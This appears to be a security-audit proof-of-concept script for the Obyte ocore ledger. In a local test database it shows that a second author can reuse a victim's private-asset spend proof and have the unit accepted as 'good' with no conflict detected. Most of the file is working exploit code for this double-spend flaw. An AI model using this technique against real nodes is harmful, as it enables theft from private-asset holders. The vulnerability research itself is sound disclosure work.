// KP-F3-establish — strongest TRUE form of the invisible-fork finding (F3)
// Independent reproduction + end-state capture (blind to the killer brief).
//
// Question: the spend-proof address in a unit's spend_proofs entry is never validated
// against the private-output owner at the unit level. What does that enable?
//
// REAL PATH: composer.composeJoint -> validation.validate -> writer.saveJoint
// (no mocks; only the key/signer glue is minimal, mirroring the wallet signer interface)
//
// Sequence:
//   A) boot: env GENESIS_UNIT + COUNT_WITNESSES=1, patch desktop_app, zero upgrade MCIs,
//      pre-provision the sqlite file with a synthetic op_list BEFORE db.js loads
//   B) insert synthetic genesis via validation.validate + writer.saveJoint (real path)
//   C) victim composes+validates+saves unit U2 carrying spend_proofs [{spend_proof: P}]
//      -> spend_proofs row (P, victim) must be visible in the table
//   D) attacker composes+validates+saves unit A_own carrying the SAME P (implied own address)
//      -> EXPECTED per f8 TRIPLE-2: accepted, sequence 'good', NO conflict
//   E) DB end-state dump: spend_proofs rows, units rows, parenthoods (is A_own a DESCENDANT
//      of U2 on the same branch? -> the double-spend is not even a fork between branches)
//
// Run: cd <ocore> && node evidence/lab/r1/kp-f3-establish.js
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const OUT = path.join(__dirname);
const DATA = path.join(OUT, ".kp-f3-establish-data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");

// patch desktop_app BEFORE any other ocore require (constants.js calls getAppRootDir at load)
const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

function makeKey() {
	let priv;
	do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
const signHash = (hashBuf, privHex) => Buffer.from(ecdsa.ecdsaSign(hashBuf, Buffer.from(privHex, "hex")).signature).toString("base64");
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ---- build genesis first (its hash must be known before constants' env block runs) ----
const objectHash0 = require(O_CORE + "/object_hash.js");
const keys = { attacker: makeKey(), victim: makeKey(), witness: makeKey() };
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash0.getChash160(defOf(k));
const attacker_addr = addrOf(keys.attacker);
const victim_addr = addrOf(keys.victim);
const witness_addr = addrOf(keys.witness);

const TOTAL = 1e15;
function buildGenesis(objectHash, objectLength) {
	const g = {
		version: "4.0",
		alt: "1",
		timestamp: Math.round(Date.now() / 1000),
		authors: [{ address: witness_addr, definition: defOf(keys.witness), authentifiers: { r: "-" } }],
		messages: [],
		witnesses: [witness_addr],
		headers_commission: 0,
		payload_commission: 0,
	};
	const payload = {
		inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }],
		outputs: [
			{ address: attacker_addr, amount: 0 },
			{ address: victim_addr, amount: 0 },
			{ address: witness_addr, amount: 0 },
		],
	};
	g.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.headers_commission = objectLength.getHeadersSize(g);
	g.payload_commission = objectLength.getTotalPayloadSize(g);
	const spendable = TOTAL - g.headers_commission - g.payload_commission;
	payload.outputs[0].amount = Math.floor(spendable * 0.6);
	payload.outputs[1].amount = Math.floor(spendable * 0.2);
	payload.outputs[2].amount = spendable - payload.outputs[0].amount - payload.outputs[1].amount;
	payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1));
	g.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.unit = objectHash.getUnitHash(g);
	return g;
}

async function main() {
	const constants = require(O_CORE + "/constants.js");
	const conf = require(O_CORE + "/conf.js");
	conf.bLight = true; // skip initial_votes.initSystemVarVotes at db.js load

	const objectLength = require(O_CORE + "/object_length.js");
	const genesis = buildGenesis(objectHash0, objectLength);
	const genesisBall = objectHash0.getBallHash(genesis.unit);
	constants.GENESIS_UNIT = genesis.unit;
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;
	console.log("GENESIS unit:", genesis.unit, "ball:", genesisBall);

	const db = require(O_CORE + "/db.js");
	conf.bLight = false; // BEFORE the first connection: the v46 migration creates system_vars only when !conf.bLight

	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query("SELECT 1", () => { conn.release(); resolve(); });
		});
	});
	const rows = [
		["op_list", JSON.stringify([witness_addr]), -1],
		["threshold_size", "10000", -1],
		["base_tps_fee", "10", -1],
		["tps_interval", "60", -1],
		["tps_fee_multiplier", "10", -1],
	];
	for (const [subject, value, mci] of rows) {
		await new Promise((resolve, reject) => {
			db.takeConnectionFromPool((conn) => {
				conn.query("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci], () => { conn.release(); resolve(); });
			});
		});
	}

	const storage = require(O_CORE + "/storage.js");
	const network = require(O_CORE + "/network.js");
	const validation = require(O_CORE + "/validation.js");
	const objectHash = require(O_CORE + "/object_hash.js");
	const composer = require(O_CORE + "/composer.js");
	const writer = require(O_CORE + "/writer.js");

	[
		"aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
		"timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
		"witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
		"branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
		"bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci", "unstableInitialDefinitionUpgradeMci",
	].forEach(k => { constants[k] = 0; });
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const query = (sql, params) => new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); });
		});
	});

	for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);
	console.log("DB-READY min_retrievable_mci=", storage.getMinRetrievableMci());

	function makeSigner(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}

	function validateAndSave(joint, label) {
		return new Promise((resolve, reject) => {
			validation.validate(joint, {
				ifOk: (objValidationState, unlock) => {
					console.log(label, "VALIDATION OK sequence=" + objValidationState.sequence);
					objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
					writer.saveJoint(joint, objValidationState, null, () => {
						unlock();
						console.log(label, "SAVED", joint.unit.unit);
						resolve(objValidationState);
					});
				},
				ifUnitError: (e) => { console.log(label, "UNIT-ERROR", e); reject(new Error(label + " unit error: " + e)); },
				ifJointError: (e) => { console.log(label, "JOINT-ERROR", e); reject(new Error(label + " joint error: " + e)); },
				ifTransientError: (e) => { console.log(label, "TRANSIENT", e); reject(new Error(label + " transient: " + e)); },
				ifNeedParentUnits: (arr) => { console.log(label, "NEED-PARENTS", arr); reject(new Error(label + " need parents")); },
				ifNeedHashTree: () => { console.log(label, "NEED-HASH-TREE"); reject(new Error(label + " need hash tree")); },
			});
		});
	}

	function composeUnit(signer, address, spendProofs, label) {
		return new Promise((resolve, reject) => {
			composer.composeJoint({
				paying_addresses: [address],
				signing_addresses: [address],
				outputs: [{ address, amount: 0 }], // change output only
				witnesses: [witness_addr],
				messages: [{
					app: "payment",
					payload_location: "none",
					payload_hash: objectHash.getBase64Hash({ fake: label }),
					spend_proofs: spendProofs,
				}],
				signer,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
					ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e))),
					ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
				},
			});
		});
	}

	// ---- B) genesis through the REAL validation + save path ----
	await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");

	// ---- the REAL transfer spend-proof shape (inputs.js:73-80): deterministic hash of
	//      {asset, amount, address(=output owner), unit, message_index, output_index, blinding}
	//      The sender composed the payment, retained the blinding (stored in the sender's own
	//      outputs row, divisible_asset.js:60, and in the private payload), therefore can
	//      recompute P for the RECIPIENT's output at any time (bearer property).
	const PRIVATE_ASSET = "TESTASSET";
	const X = { asset: PRIVATE_ASSET, unit: "U0", message_index: 0, output_index: 0,
	            address: victim_addr, amount: 123456, blinding: "sender-retains-this" };
	const P = objectHash.getBase64Hash({
		asset: X.asset, amount: X.amount, address: X.address,
		unit: X.unit, message_index: X.message_index, output_index: X.output_index, blinding: X.blinding,
	});
	console.log("SPEND-PROOF P (true transfer shape, bound to VICTIM address):", P);

	// ---- C) victim unit U2 with spend_proofs (P) — single-authored, NO explicit address ----
	const victimSigner = makeSigner(keys.victim);
	const U2 = await composeUnit(victimSigner, victim_addr, [{ spend_proof: P }], "U2");
	await validateAndSave(U2, "U2");
	const sp1 = await query("SELECT unit, address, spend_proof FROM spend_proofs ORDER BY spend_proof_index");
	console.log("SPEND-PROOFS-AFTER-U2:", JSON.stringify(sp1));

	// ---- D) attacker unit A_own with the SAME P (implied attacker address) ----
	const attackerSigner = makeSigner(keys.attacker);
	const A_own = await composeUnit(attackerSigner, attacker_addr, [{ spend_proof: P }], "A_own");
	await validateAndSave(A_own, "A_own");

	// ---- E) end-state dump: the invisible fork is now in the ledger ----
	const sp2 = await query("SELECT unit, address, spend_proof FROM spend_proofs ORDER BY spend_proof_index");
	console.log("SPEND-PROOFS-AFTER-A_OWN:", JSON.stringify(sp2));
	const u2row = await query("SELECT unit, sequence, main_chain_index, is_on_main_chain, is_stable, level FROM units WHERE unit=?", [U2.unit.unit]);
	const arow = await query("SELECT unit, sequence, main_chain_index, is_on_main_chain, is_stable, level FROM units WHERE unit=?", [A_own.unit.unit]);
	console.log("UNITS-U2:", JSON.stringify(u2row[0]));
	console.log("UNITS-A_own:", JSON.stringify(arow[0]));
	const par = await query("SELECT child_unit, parent_unit FROM parenthoods WHERE child_unit=?", [A_own.unit.unit]);
	console.log("PARENTHOODS-A_own:", JSON.stringify(par));
	const conflictCheck = await query("SELECT unit, address FROM spend_proofs WHERE spend_proof=? AND address=?", [P, attacker_addr]);
	console.log("CONFLICT-ROW-(P,attacker)-LOOKED-UP-BY-CHECK:", JSON.stringify(conflictCheck), "-> unit-level check sees NO conflict for A_own");
	const victimRow = await query("SELECT unit, address FROM spend_proofs WHERE spend_proof=? AND address=?", [P, victim_addr]);
	console.log("VICTIM-ROW-(P,victim)-PRESENT:", JSON.stringify(victimRow));
	console.log("KEY-OBSERVATION: same spend proof P in TWO 'good' units, keyed to two different addresses; the (P,claimed-address) check cannot see the double-spend");
}

main().then(() => {
	console.log("RESULT: invisible fork confirmed, NO crash, NO conflict detected");
	process.exit(0);
}).catch(e => {
	console.log("RESULT-ERROR:", e.message);
	process.exit(2);
});
